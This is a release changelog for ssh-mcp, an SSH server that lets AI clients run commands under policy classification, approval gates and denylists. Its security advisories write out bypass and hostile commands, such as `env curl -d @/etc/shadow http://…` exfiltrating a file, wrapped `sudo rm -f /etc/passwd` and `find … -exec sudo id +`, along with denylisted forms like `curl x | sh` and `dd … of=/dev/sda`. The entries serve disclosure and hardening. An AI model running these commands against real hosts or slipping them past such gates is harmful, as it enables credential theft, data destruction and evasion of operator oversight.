  **An invocation mistake no longer looks like a crash.** Everything reached the operator through `console.error('Fatal error:', error)`, which prints the Error object — so a mistyped flag arrived as a stack trace through `buildAppConfig` and `main`, burying the explanation written for them. Errors about how the server was invoked or configured now print as their message alone and **exit 2**; a real defect keeps its stack and exits 1, so a supervisor can tell the two apart. The same treatment was applied to the other startup failures still printing stacks: a missing `--bearerToken`, an invalid `[policy]` section, an unparseable denylist pattern, credential-resolution failures and host-key refusals.

  **CI now runs the unit and property suites on `windows-latest`**, with coverage uploaded, since win32 branches are unreachable from the Ubuntu job and would otherwise count as untested however well they are covered. Windows has been a documented target since 2.0.0 and no job had ever executed a single win32 branch, which is why a check that could not pass survived twelve releases.

  ## Behaviour changes

  - **A config file at the default path is no longer ignored when it cannot be loaded.** If you have one there with mode `0644` (the default under `umask 022`), or a stale or malformed one, and you have been running off `--host`/`--user`, the server now refuses to start instead of silently ignoring the file. Fix it, `chmod 600` it, remove it, or point `--config` elsewhere — and note the _directory_ must be `0700`, which `chmod 600` on the file does not achieve.
  - **The published Docker image created its config directory `0755`**, which that same check refuses. The image now creates it `0700`. If you build your own image or mount a config directory, it must be `0700`.
  - **On Windows the config file is now read _and its ACL checked_, so it can refuse to start.** A config whose ACL grants anyone beyond your account, `SYSTEM` and `Administrators` is refused where it was previously ignored — as is one whose ACL cannot be read (except when `icacls` is absent or the check times out, which warn and load). Fix it with the two `icacls` commands the refusal prints, move it under `%APPDATA%\ssh-mcp`, or pass `--allowUncheckedConfigAcl` for the unreadable cases; the flag does not override a known-broad ACL. Separately, a config at `%APPDATA%` that previously could not load now takes effect, so an operator also passing `--host`/`--user` was silently running off the flags and the file now wins — a note on stderr says so.
  - **Operator errors now exit 2** instead of 1; a defect still exits 1. Anything matching on status 1 to detect a startup failure needs updating.
  - `loadConfig` no longer rejects with Node's `ENOENT` SystemError for a missing file; it rejects with `ConfigNotFoundError`, which carries `code: 'ENOENT'` for anything that was matching on it.

## 2.2.6

### Patch Changes

- [#136](https://github.com/tufantunc/ssh-mcp/pull/136) [`ceb1981`](https://github.com/tufantunc/ssh-mcp/commit/ceb19816c5282aa1ccb6207401e2d6c2efd019dd) Thanks [@tufantunc](https://github.com/tufantunc)! - Say what a decision was about, and what a refusal leaves you able to do.

  **`binary` now names the command the class describes** ([#134](https://github.com/tufantunc/ssh-mcp/issues/134)). Since elevation began to be detected per segment in 2.2.4, the class and the binary could describe different commands: `echo hi; sudo id` recorded `binary: "echo"` against a `privileged` decision, and `cd /srv && sudo systemctl restart app` recorded `cd`. That is what reached the audit log, the OTel span attribute `command.binary` and OPA's `resource.binary`, so an auditor filtering the store by binary would not have found the privileged decision at all.

  It now names what runs under elevation — `id`, `systemctl` — looking past exec wrappers, `NAME=value` assignments and the prefix's own value-taking flags, and falling back to the prefix itself for a bare `sudo`. Every other class still names the leading command, which is what it always meant. No decision changes: `binary` is a classification input only in the read-only allowlist check, and the privileged branch returns before reaching it.

  **`HOST_KEY_MISMATCH` no longer leaves the reader to guess.** It stated that the key had changed and stopped there, truncating both fingerprints to twenty characters — the one comparison the reader has to make, made harder. A rebuilt server and an interception produce the identical symptom, and with nothing to separate them the available move is `--insecureHostKey`, which disables verification for every host and every future connection rather than for this one. The message now names both causes, shows both fingerprints in full, says to confirm out of band and how (`ssh-keygen -lf` on the host itself), points at `trustedHostKey` for the genuine case, and says plainly what the escape hatch costs.

  **Credential resolution failures name the method the profile asked for.** The message listed all four available methods regardless of which one `auth` selected, which reads as an invitation to take whichever is easiest — and the easiest is a plaintext password in the environment. It now says which method was requested and why it produced nothing (`SSH_AUTH_SOCK` unset, `keychainEntry` missing, and so on), then orders the alternatives by how much each exposes.

  All three are the same defect with different surfaces: the mechanism decided correctly and then described the outcome rather than what produced it. `explainRoleDenial`, the denylist refusal and `APPROVAL_DENIED` were earlier instances.

## 2.2.5

### Patch Changes

- [#132](https://github.com/tufantunc/ssh-mcp/pull/132) [`bb425be`](https://github.com/tufantunc/ssh-mcp/commit/bb425bedccb4b2c75cea50e4faf097864169f268) Thanks [@tufantunc](https://github.com/tufantunc)! - Recognise the elevation binaries that 2.2.4 stopped catching, and two it never caught.

  The fix for [GHSA-6f54-mjqq-2jp8](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-6f54-mjqq-2jp8) replaced four `^`-anchored regexes with exact membership in a set of four names. `/^\s*su\b/` had matched between `su` and a hyphen, so `su-exec` and `sudo-rs` were classified `privileged` — by accident of the regex rather than by intent, but the effect was protective. Exact matching dropped them, and on a `prod`-group profile that turned a `deny` into an `allow`. A security release narrowed a security control, which is not acceptable however narrow the shape.

  `gosu` and `run0` were caught by neither the old form nor the new one. `su-exec` and `gosu` are the standard elevation binaries of Alpine and Docker images; `sudo-rs` is the Rust implementation now shipping as the default sudo on some distributions; `run0` is systemd's replacement. A host using any of them had no elevation gate at all, before or after 2.2.4.

  `PRIVILEGE_PREFIXES` now lists `su-exec`, `gosu`, `sudo-rs`, `run0` and `pfexec` alongside `sudo`, `su`, `doas` and `pkexec`. It stays an explicit list rather than a pattern, because a pattern cannot tell `sudoedit` — which edits a file and is not elevation — from `sudo-rs`, which is sudo. That means it has to be maintained by hand as new implementations appear, and the cost of missing one is that its commands classify `safe`.

  Found by [@burtherman](https://github.com/burtherman)'s work on [#130](https://github.com/tufantunc/ssh-mcp/pull/130) — reviewing that branch is what surfaced the `\b` behaviour, and the same gap turned out to be in the advisory fix.

## 2.2.4

### Patch Changes

- [`5e80747`](https://github.com/tufantunc/ssh-mcp/commit/5e80747b705bf073cad9a89e676040bb54a02ddd) Thanks [@tufantunc](https://github.com/tufantunc)! - **Security:** fix a read-only and approval-gate bypass in command classification ([GHSA-6f54-mjqq-2jp8](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-6f54-mjqq-2jp8), CVSS 8.8). Affects 2.0.0 through 2.2.3.

  The read-only allowlist vouches for a binary _name_, and two of the names it vouched for do not do what the name says.

  `env` is an exec wrapper: `env <cmd>` runs `<cmd>`. Allowlisting the name meant the wrapped command was never classified, so `env sudo rm -f /etc/passwd` came back `read-only` and executed on a profile configured `readOnly = true` — the setting the README recommends for monitoring and observer access, reached through `read-command`, the tool whose whole contract is that it cannot mutate. No shell metacharacter is involved, so the `SHELL_CONTROL_CHARS` gate added for GHSA-r8hm-vpm8-cfh6 did not catch it either. `env curl -d @/etc/shadow http://…` exfiltrated any file the SSH user could read, with no elevation at all.

  `find` writes and executes given the right flag. `find /var/www -delete` removed a directory tree and `find / -name x -exec sudo id +` ran a command as root, both classified `read-only`. The `-exec … \;` spelling escaped only because `;` happens to be a shell metacharacter; the `+` terminator carries none.

  The same name-based blindness hid elevation from the approval gate. Privilege prefixes were matched by four `^`-anchored regexes, so anything standing before one dropped the command to `safe` — which the default bindings grant to `admin` and `operator` on every tier:

  ```
  env sudo systemctl stop nginx      nohup sudo id       timeout 5 sudo id
  FOO=1 sudo id                      "sudo" id           \sudo id
  echo hi; sudo id                   cd /srv && sudo systemctl restart app
  ```

  Fixed by looking at what a shell would actually run: `env` leaves the read-only allowlist (as `curl` and `wget` did, for the same reason, and it still reaches `run-command` under policy); `find` carrying `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir` or a `-f*` output flag classifies destructive; and elevation is detected per segment, past exec wrappers, `NAME=value` assignments, leading options and quoting. Reading _about_ sudo is untouched — `grep sudo /var/log/auth.log`, `cat /etc/sudoers` and `find /etc -name "*.conf"` all stay `read-only`, which is the distinction a tokenizer buys over a substring search.

  **Behaviour change worth knowing about.** A bare `env`, which only prints the environment, is no longer `read-only`; a name-based allowlist cannot tell it from `env <cmd>`. And under the default bindings a compound or wrapped `sudo` on a `prod`-group profile is now refused rather than silently run — that is the point of the fix, but it will surface as newly-failing commands where it previously succeeded. `--group=staging`/`dev`, or a `[policy.roleBindings]` override granting `admin.prod` the `privileged` class, restores it deliberately.

  Reported through review of [#130](https://github.com/tufantunc/ssh-mcp/pull/130) by [@burtherman](https://github.com/burtherman), whose fix for the anchored-prefix half of this is what prompted auditing the rest of the classifier's assumptions.

## 2.2.3

### Patch Changes

- [#127](https://github.com/tufantunc/ssh-mcp/pull/127) [`a3fcc35`](https://github.com/tufantunc/ssh-mcp/commit/a3fcc35ab2d0bbdda2b1b7889a227e7d53f95f45) Thanks [@nordscope-fi](https://github.com/nordscope-fi)! - Let a config file say "no command-length limit", the way the CLI flag already can ([#123](https://github.com/tufantunc/ssh-mcp/issues/123)).

  `--maxChars=none` disables the cap and the README documents `none` or `0` as doing so. The TOML schema was `positive()`, so `commandMaxChars = 0` was a startup error and the config file had no spelling for it. Moving a flags-based invocation into a config file therefore tightened the limit back to the 5000 default, and the only way to express uncapped was to write `9007199254740991` out in full.

  `commandMaxChars` and the per-profile `maxChars` are now `nonnegative()`, with `0` meaning unlimited. That is the convention this config file already uses for `commandQuotaPerDay` and `approvalGrantTtlMs`, so `commandMaxChars` was the odd one out rather than the key needing a new spelling invented for it.

  **`0` is mapped rather than merely permitted.** `sanitizeCommand` tests `cleaned.length > maxChars`, so a literal `0` arriving there would reject every non-empty command with `Command is too long (max 0 characters)` — a worse failure than the one being fixed. `normalizeConfig` maps it to `Number.MAX_SAFE_INTEGER`, the same value `parseMaxChars` produces for the flag, so the two surfaces hand the rest of the code an identical `Profile` rather than two spellings of uncapped.

  Negatives stay rejected. `--maxChars=-1` means unlimited only as a wart of `parseInt` handling, it is undocumented, and it is likelier to be a typo than an intent; parity is worth having between the documented behaviours, not between the accidents.

- [#129](https://github.com/tufantunc/ssh-mcp/pull/129) [`369bfca`](https://github.com/tufantunc/ssh-mcp/commit/369bfca5d14d832d0dde679353bf23d93a4e9a31) Thanks [@tufantunc](https://github.com/tufantunc)! - Make command classification linear, so an unbounded command cannot stall the server.

  Four of the fourteen never-allowed patterns were quadratic: `dd\s.*\bof=/dev/`, the two `curl`/`wget` pipe-into-shell forms, and `chown\s+-R\s.*\s/\s*$`. Each has a cheap literal head, so the engine matched it at O(n) offsets and dragged a `.*` or `[^|]*` across the remainder from each one. A command built by repeating those literals cost 255 ms at 64 KB and **65 seconds at 1 MB**, all of it blocking the single-threaded event loop.

  The stall sits inside `classifyCommand`, which runs _before_ the approval gate and before the allow/deny decision — so `approvalPolicy = "ask-all"`, `role = "viewer"` and `readOnly = true` gave no protection. One `run-command` call was enough to stop every other profile, session and in-flight command on the server.

  The four are now segment checks over the same tokenizer that already decides power-state invocations: split on shell separators, read the head binary past any `sudo`, and look at its arguments. Nothing there can backtrack. The same 1 MB command now classifies in 45 ms, and behaviour is unchanged — `curl x | sh`, `dd if=x of=/dev/sda`, `chown -R root:root /` and the rest are refused exactly as before, while `curl http://x/data.json`, `dd if=/dev/zero of=/tmp/scratch` and `chown -R app:app /srv/app` still are not.

  `classifier.ts` predicted this in writing: _"a policy check should not depend on a limit set three layers away and configurable to any value."_ Until now `sanitizeCommand`'s `maxChars` was that limit and the default 5000 kept the cost invisible. Letting a config file say `commandMaxChars = 0` removed it, which is what turned a latent property into a reachable one. The check no longer depends on it either way.

  Also in this change: `[defaults].commandMaxChars = 0` is now mapped to the same sentinel as the per-profile `maxChars`, so no literal `0` survives anywhere in the resolved config — a value that would otherwise reject every non-empty command if any caller copied it into a profile. And the README's annotated production profile no longer demonstrates the uncapped spelling on a host it calls `prod-web-1`; the `[defaults]` line documents it instead.

## 2.2.2

### Patch Changes

- [#124](https://github.com/tufantunc/ssh-mcp/pull/124) [`3706c1a`](https://github.com/tufantunc/ssh-mcp/commit/3706c1ad0ba8f48e6ba454e6220d5593e64d5ccc) Thanks [@tufantunc](https://github.com/tufantunc)! - Fix the approval dialog turning Accept into a decline, and three boolean CLI flags that did nothing ([#91](https://github.com/tufantunc/ssh-mcp/issues/91)).

  **Approving a command now takes one keystroke, and works.** The elicitation request asked for a required `confirm` boolean on top of the protocol's own `accept`/`decline`, so clients rendered a checkbox beside the accept row. Choosing Accept without ticking it submitted a form missing a required field, the client answered `cancel`, and ssh-mcp reported `APPROVAL_DENIED: User did not approve this command` — to a user who had just pressed Approve. The decision now comes from `action` alone. An explicit `confirm: false` is still honoured for clients that send one.

  **Approval waits 10 minutes instead of 60 seconds.** The request inherited the SDK's `DEFAULT_REQUEST_TIMEOUT_MSEC`, setting a human's reading time from a default meant for machine round trips. An operator who stepped away, or who was working out an unfamiliar dialog, had it expire underneath them.

  **A timed-out approval says so.** `APPROVAL_UNAVAILABLE` led with "a client without elicitation support" for every error, including a timeout where support was fine — the same wrong-cause defect the message was split out to fix, one release later, inside its own fix. Timeouts now name the elapsed budget and say the prompt may still be open.

  **`--disableApproval`, `--auditEntropyScan` and `--auditTamperEvident` were no-ops.** `parseArgv` stores `null` for a flag written without `=`, which is how all three are documented, and each call site tested that for truthiness. They did nothing unless spelled `--flag=1`. The audit pair is the serious half: anyone who turned on hash-chained tamper-evident logging was running without it and had no signal. All flags now read presence through one helper, and `--flag=false` (or `0`, `no`, `off`) turns one back off.

## 2.2.1

### Patch Changes

- [#121](https://github.com/tufantunc/ssh-mcp/pull/121) [`cffa6a2`](https://github.com/tufantunc/ssh-mcp/commit/cffa6a2e697c5bc2be17271ca887d581480ecf6b) Thanks [@tufantunc](https://github.com/tufantunc)! - Stop refusing read-only commands for mentioning a dangerous word, and say what a refusal actually refused ([#91](https://github.com/tufantunc/ssh-mcp/issues/91)).

  The never-allowed list matched `shutdown`, `reboot`, `halt`, `poweroff` and `eval` anywhere in the command string, so reading about one was refused as if it caused one. `last reboot`, `grep -r reboot /etc/`, `cat /var/run/reboot-required` and `journalctl | grep shutdown` were all denied. On a NAS, where an agent tends to check boot history early, this landed on the first command.

  These five now match an _invocation_: the head of each `;`/`&&`/`||`/`|`/newline-separated segment, looked at past any `sudo`/`doas`/`pkexec` prefix and its value-taking flags, with the directory part stripped. `sudo -u root reboot`, `/sbin/reboot`, `true && reboot` and `systemctl reboot` are still refused; `sudo grep reboot /var/log/syslog` is not. The check is a tokenizer rather than a regex, so it adds no backtracking to a path that is deliberately free of it.

  A knock-on fix: a command that merely mentions one of these words is no longer _classified_ destructive either. `cat /var/run/reboot-required` comes back read-only, which is what it is.

  **Refusals now name what matched.** `Command matches denylist pattern` said nothing — not the rule, not its origin, not whether the reader could change it. A built-in refusal now names the rule and states that `[policy].denylist` adds patterns rather than removing these; an operator pattern is quoted back with the config key that carries it.

  **`APPROVAL_DENIED` no longer covers two different failures.** Approval fails closed, so a client that cannot be asked — no elicitation support, a transport failure, a malformed reply — denied the command with `User did not approve this command`, blaming the user for a prompt they never saw. That case is now `APPROVAL_UNAVAILABLE`, carrying the underlying error. The real decline keeps `APPROVAL_DENIED`. The diagnosis previously existed only on stderr, which for a stdio server is a client log file nobody reads.

## 2.2.0

### Minor Changes

- [#108](https://github.com/tufantunc/ssh-mcp/pull/108) [`fdd6df4`](https://github.com/tufantunc/ssh-mcp/commit/fdd6df4e8ff1d1a17b476c3b4fed9b2857bad448) Thanks [@nordscope-fi](https://github.com/nordscope-fi)! - Read policy overrides from the config file, and refuse to start when the policy does not mean what it says.

  An optional `[policy]` section is now merged over the compiled-in `DEFAULT_RULES` at startup, so `roleBindings` and `denylist` can be set without relabelling a host or standing up an OPA sidecar ([#95](https://github.com/tufantunc/ssh-mcp/issues/95)). The merge is at role and tier depth, so defining `admin.prod` leaves `admin.staging`, `admin.dev`, `viewer` and `operator` on their defaults. Roles and tiers absent from the defaults are added rather than rejected, which is what makes a custom `group` on a profile resolve to real bindings.

  An OPA sidecar is not an alternative route to the same grant: OPA is consulted only for commands the local policy already allows, so it can refuse more but never widen. Widening happens in `[policy]` or not at all.

  **Nothing is silently ignored any more.** Every way a config could be written, parsed and then quietly mean nothing is now a startup error naming the file's own vocabulary — which is the bug this release exists to close, since [#95](https://github.com/tufantunc/ssh-mcp/issues/95) was exactly that shape. Startup fails on:

  - an unrecognised top-level section or key anywhere in the config (the root schema is now `.strict()`);
  - a command class outside `read-only | safe | destructive | privileged`, so a `priviledged` typo cannot parse into a grant of nothing and then read like a policy decision;
  - a role or tier under `[policy.roleBindings]` that no profile can reach, so `[policy.roleBindings.operater]` cannot merge in as a fourth role while `operator` keeps its defaults;
  - a profile whose `role` has no bindings, which used to be silently demoted to read-only;
  - a profile whose tier — set explicitly, or inferred from the profile name — has no bindings under its role;
  - an invalid regex in `denylist`;
  - a role or tier named `__proto__`, `constructor` or `prototype`, which would be accepted and then not exist once merged.

  All problems are reported at once rather than one per restart.

  An unresolved tier no longer falls back to the role's `prod` cell. While the matrix was compiled in, that fallback meant falling back to the strictest cell for that role; once `[policy]` can write `prod`, the same hop hands an unresolved tier whatever production was granted. A partial custom role plus profiles that set no `group` was enough to reach it with no typo involved.

  **Upgrade notes — read these before upgrading, even though this is a minor release.** Two kinds of config that started under 2.1.0 now fail at load. That is normally a major, and shipping it as a minor is a deliberate call rather than an oversight: the reach of both is narrow, and neither failure is silent — each names the offending line and tells you what to write instead. But it does mean a `^2.1.0` range will pick this up automatically, so nothing warns you by version number alone. Both failures are the point of the release rather than side effects:

  1. **An unrecognised top-level section.** Previously parsed cleanly and was dropped, so an upgrade can surface a typo that has been inert for some time — including a `[policy]` block written against the old README, which said such a block was accepted and ignored. Read any pre-existing `[policy]` section before upgrading: it is live now, and the usual content of one is a grant.
  2. **A custom `role` on a profile.** `role` is a free string that only ever matched `viewer`, `operator` or `admin`; anything else was silently demoted to read-only. That now stops startup, and it is the one new failure that can fire on a config carrying no `[policy]` section at all. Either correct the role, or give it bindings with `[policy.roleBindings.<role>]`.

## 2.1.0

### Minor Changes

- [#93](https://github.com/tufantunc/ssh-mcp/pull/93) [`4b04639`](https://github.com/tufantunc/ssh-mcp/commit/4b0463974a5794111ccca22f1543c82853826545) Thanks [@tufantunc](https://github.com/tufantunc)! - Add `--group`, and say which of role, group and class caused a policy refusal.

  A quick-start profile (`--host`/`--user`, no config file) carried no host group,
  so it fell to the strictest tier — where the `admin` role has no `privileged`.
  `sudo` could therefore never run for anyone who had not written a TOML config,
  and no flag existed to change it. Reported in [#91](https://github.com/tufantunc/ssh-mcp/issues/91).

  `--group` accepts `prod`, `staging` or `dev`. The default is still `prod`:
  treating an unknown host as production is the safe guess, and what was missing
  was a way to correct it. An unrecognised value is rejected rather than quietly
  falling back to the prod bindings.

  ```bash
  npx ssh-mcp --host=10.0.0.5 --user=deploy --group=dev
  ```

  The refusal itself was also misleading. It read:

  ```
  Role "admin" cannot run "privileged" commands
  ```

  naming the role and the class but not the host group, which is usually what
  decided. It now names all three, lists what the role _can_ run, and — when the
  group was inferred rather than configured — says so and how to set one:

  ```
  Role "admin" on host group "prod" cannot run "privileged" commands
  (allowed: read-only, safe, destructive). No group is set for profile "default",
  so it defaulted to the most restrictive tier. Set group = "dev" or "staging" on
  the profile, or pass --group, if this host is not production.
  ```

## 2.0.4

### Patch Changes

- [#88](https://github.com/tufantunc/ssh-mcp/pull/88) [`51cd60c`](https://github.com/tufantunc/ssh-mcp/commit/51cd60cff91fb733138668642670bf384deba2e3) Thanks [@tufantunc](https://github.com/tufantunc)! - **Security.** Treat every shell metacharacter as disqualifying when deciding whether a command is read-only.

  The gate that decides whether an allowlisted binary counts as `read-only` tested
  only `>`, `;` and `|`. Command substitution — `$(...)` and backticks — was not in
  that set, so a command like `ls $(...)` was classified read-only, accepted by
  `read-command`, and expanded by the remote shell, which ran the inner command.
  The `read-command` tool is what the `viewer` role is restricted to, so its
  read-only guarantee could be escaped.

  The gate now rejects every character with syntactic meaning to a shell —
  `; & | < > \` $ ( ) { }` and newlines — rather than enumerating dangerous
  constructs, which is a list that is never finished.

  **Behaviour change:** commands using shell syntax are no longer classified
  read-only even when the binary is allowlisted. `echo $HOME` and `ls | grep x` now
  fall to the `safe` class, which `read-command` refuses and `run-command` accepts
  under the profile's approval policy. If you granted a client standing permission
  for `read-command`, that permission is now narrower — which is what it was
  supposed to be.

  Reported privately. Upgrading is recommended for anyone relying on the `viewer`
  role or on `read-command` as a security boundary.

## 2.0.3

### Patch Changes

- [#86](https://github.com/tufantunc/ssh-mcp/pull/86) [`a1f5488`](https://github.com/tufantunc/ssh-mcp/commit/a1f548819b1fa23a5822f9f91ab52512413c714b) Thanks [@tufantunc](https://github.com/tufantunc)! - Re-establish the connection when opening a session or exec channel, instead of retrying a dead one.

  Channel opens run under `openWithRetry`, but the callbacks reached for the SSH
  client directly. `openSession` checks the link first, so an already-dead
  connection is rebuilt there — the gap is a link that dies _after_ that check,
  while the channel is opening. Every retry then called `getClient()` on a null
  client and threw the same `SSH connection not established`, so the retry re-ran a
  dead connection three times and gave up.

  Dropbear drops the whole connection under channel churn rather than refusing the
  individual channel, so it hits this readily; any server that closes connections
  under load can. `SftpClient` already re-established inside its retry — the
  session and exec paths now do the same.

## 2.0.2

### Patch Changes

- [#83](https://github.com/tufantunc/ssh-mcp/pull/83) [`2053c9a`](https://github.com/tufantunc/ssh-mcp/commit/2053c9aff19d74abb140e6cfd5c16f0fd9a91b4a) Thanks [@tufantunc](https://github.com/tufantunc)! - Refuse to guess which host to use when several profiles are configured and none is selected.

  `getProfile` fell back to `profiles[0]` when a tool call carried no `profile`
  argument and no `defaults.defaultProfile` was set. With several hosts configured
  that meant the command ran against whichever profile happened to be listed
  first — no argument, no warning — and the first one written down tends to be
  production.

  It now raises an error naming the configured profiles and both ways to resolve
  the ambiguity:

  ```
  No profile selected and no default configured, but 3 profiles exist:
  prod, staging, dev. Pass a "profile" argument, or set
  defaults.defaultProfile in the config.
  ```

  A single configured profile is unambiguous and still resolves without one.

  If you run several profiles without `defaultProfile` today, set it (or pass
  `profile` per call) — previously that configuration ran commands against the
  first profile in the file.

  Reported by @Isla-Liu in [#54](https://github.com/tufantunc/ssh-mcp/issues/54).

## 2.0.1

### Patch Changes

- [#79](https://github.com/tufantunc/ssh-mcp/pull/79) [`93ec377`](https://github.com/tufantunc/ssh-mcp/commit/93ec377891ea01193e06fec78501cc3c5a108f76) Thanks [@tufantunc](https://github.com/tufantunc)! - Fix an event-loop stall on remote command output, and derive session markers from a CSPRNG.

  - **Interactive session output could stall the whole server.** Trailing newlines
    were trimmed with `/\n+$/`, which is unanchored at the start: on output that is
    mostly newlines but does not end in one, the regex engine retries from every
    offset. The session buffer holds up to 2 MB of whatever the remote command
    printed, where that measured at roughly 25 minutes of blocked event loop —
    shared by every session and connection the server has open. Trimming is now
    done by index.

  - **Session markers came from `Math.random()`.** Markers separate a command's
    output from the trailer carrying `$?` and `$PWD`, so predicting one is enough
    to forge an exit code or working directory — a failed command recorded as
    successful. Every marker is written to the remote host in the clear, and
    `Math.random()` is reconstructible from observed output. They now come from
    `crypto.randomBytes`.

  - **Denylist patterns no longer depend on a distant length cap.** The forbidden
    patterns for `curl … | sh`, `wget … | sh`, `dd … of=/dev/…` and `chown -R … /`
    paired `\s+` with `.*`, letting both claim the same run of spaces. Reaching
    them requires passing `sanitizeCommand`, which caps commands at
    `profile.maxChars` (5000 by default), so this was not exploitable at stock
    settings — but that limit is configurable to any value and lives three layers
    away. The patterns match the same commands as before, which is covered by
    tests.

## 2.0.0

### Major Changes

- [#72](https://github.com/tufantunc/ssh-mcp/pull/72) [`37bf26f`](https://github.com/tufantunc/ssh-mcp/commit/37bf26fa76c617c3f0e007f918ee4b53db6303d8) Thanks [@tufantunc](https://github.com/tufantunc)! - v2: policy-gated, auditable SSH access

  A near-total rewrite. **This release contains breaking changes** — every v1
  installation needs config changes. See "Migrating from v1" in the README.

  ### Breaking

  - **Tools renamed and split.** `exec` → `read-command` (allowlisted read-only
    commands) and `run-command` (arbitrary commands, destructive ones gated by
    approval). `sudo-exec` → `privileged-command`. The `description` parameter is
    gone.
  - **Credential flags removed.** `--password`, `--suPassword`, `--sudoPassword`
    and `--disableSudo` no longer exist: secrets on the command line are visible
    in `/proc/<pid>/cmdline` to every local user. Credentials now resolve through
    an agent → OS keychain → env var → key file cascade. Startup fails with a
    migration hint if a removed flag is passed.
  - **Command results now carry status.** A non-zero exit is returned as an error
    result with the exit code and stderr, instead of stdout alone.
  - **Config file.** Multi-host setups move to a TOML config (`--config`, or the
    platform config dir) with profiles, roles and approval policy. Single-host
    `--host/--user` invocations still work.

  ### Added

  - Policy engine: command classification (read-only / safe / destructive /
    privileged), role bindings, denylist, and optional OPA sidecar evaluation.
  - Approval gate via MCP elicitation for destructive and privileged commands.
  - Audit log (JSONL, redacted, optional hash-chained tamper evidence).
  - Interactive and background sessions with persistent CWD/env, TTL and reaping.
  - SFTP upload/download, `signal-process`, MCP resources for connection and
    session discovery.
  - Secret redaction (field, regex and entropy layers) on everything returned to
    the client, written to the audit log, or attached to a trace span.
  - Host key verification (TOFU by default, pinning via `trustedHostKey`) and a
    frozen modern algorithm allow-list.
  - HTTP transport with mandatory bearer auth, per-session MCP transports, rate
    limiting and a 1MB body cap; OpenTelemetry tracing; progress notifications and
    request cancellation.

  ### Fixed

  - Command injection through unsanitized metadata ([#44](https://github.com/tufantunc/ssh-mcp/issues/44)).
  - Secret exposure in server logs ([#42](https://github.com/tufantunc/ssh-mcp/issues/42), [#43](https://github.com/tufantunc/ssh-mcp/issues/43)).
  - PTY/channel accumulation exhausting the connection ([#34](https://github.com/tufantunc/ssh-mcp/issues/34)).
  - zod / SDK version incompatibility ([#47](https://github.com/tufantunc/ssh-mcp/issues/47), [#51](https://github.com/tufantunc/ssh-mcp/issues/51), [#37](https://github.com/tufantunc/ssh-mcp/issues/37)).
  - Encrypted private keys via passphrase ([#25](https://github.com/tufantunc/ssh-mcp/issues/25)).
  - Sudo passwords no longer appear in the remote process list — the password is
    piped over stdin rather than embedded in the command line.

### Patch Changes

- [#72](https://github.com/tufantunc/ssh-mcp/pull/72) [`90a8c85`](https://github.com/tufantunc/ssh-mcp/commit/90a8c858d64564d68e3997af67711cb815327633) Thanks [@tufantunc](https://github.com/tufantunc)! - Update @modelcontextprotocol/sdk to ^1.30.0 and enable DNS rebinding protection
  on the HTTP transport.

  The dependency was pinned to `~1.17.5`, a range that could never receive fixes
  for three advisories against it: cross-client data leak via shared
  server/transport reuse (GHSA-345p-7cg4-v4c7), DNS rebinding protection not
  enabled by default (GHSA-w48q-cv73-mx4w), and a ReDoS (GHSA-8r9q-7v3j-jr4g).

  The HTTP transport now validates the Host header. A page the user visits can
  make their browser POST to a localhost server, and the bearer token does not
  help if the browser is tricked into attaching it — checking Host is what stops
  it. Defaults to the bind address plus localhost; override with `--allowedHosts`
  when running behind a reverse proxy that presents a different hostname.
